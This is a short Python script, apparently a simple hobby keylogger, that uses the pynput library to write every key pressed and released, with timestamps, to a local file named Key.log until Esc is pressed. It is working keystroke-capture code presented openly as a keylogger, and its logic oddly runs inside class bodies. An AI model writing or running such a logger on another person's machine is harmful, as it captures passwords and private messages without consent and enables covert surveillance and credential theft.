import datetime
import logging
import time

from pynput import keyboard


class Logger():
        logging.basicConfig( filename=("Key.log"), filemode="w", format='%(asctime)s:%(message)s',
                             level=logging.DEBUG )

class Listener():
    def on_press(key):
        try:
            # logging.warning("{:%H:%M:%S, %d %B, %Y}".format( datetime.datetime.now() ))
            logging.warning( '---> Alphanumeric key ({0}) pressed'.format( key.char ) )
        except AttributeError:
            logging.warning( '---> Special key {0} pressed'.format(
                    key ) )
            # logging.warning( "{:%H:%M:%S, %d %B, %Y}".format( datetime.datetime.now() ) )

    def on_release(key):
        logging.warning( '---> {0} released'.format(
                key ) )
        # Turns off keylogger
        if key == keyboard.Key.esc:
            return False

    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release ) as listener:
        listener.join()
